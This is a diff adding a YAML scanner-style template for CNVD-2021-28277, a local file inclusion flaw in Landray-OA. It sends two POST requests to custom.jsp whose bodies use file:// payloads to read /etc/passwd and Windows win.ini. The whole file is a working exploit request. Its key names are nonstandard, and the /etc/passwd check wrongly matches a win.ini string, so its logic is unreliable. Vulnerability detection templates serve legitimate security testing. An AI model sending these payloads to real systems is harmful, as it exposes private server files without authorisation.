@@ -1,0 +1,44 @@
+id: CNVD-2021-28277
+brief:
+    title: Landray-OA - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: Landray-OA is susceptible to local file inclusion.
+    label:
+        - cnvd
+        - cnvd2021
+        - landray
+        - lfi
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/sys/ui/extend/varkind/custom.jsp'
+      head:
+        Accept: '*/*'
+        Content-Type: application/x-www-form-urlencoded
+      body: var={"body":{"file":"file:///etc/passwd"}}
+      signs:
+        - "on": word
+          has:
+            - for 16-bit app support
+          in: body
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/sys/ui/extend/varkind/custom.jsp'
+      head:
+        Accept: '*/*'
+        Content-Type: application/x-www-form-urlencoded
+      body: var={"body":{"file":"file:///c://windows/win.ini"}}
+      signs:
+        - "on": word
+          has:
+            - for 16-bit app support
+          in: body
+        - "on": status
+          status:
+            - 200
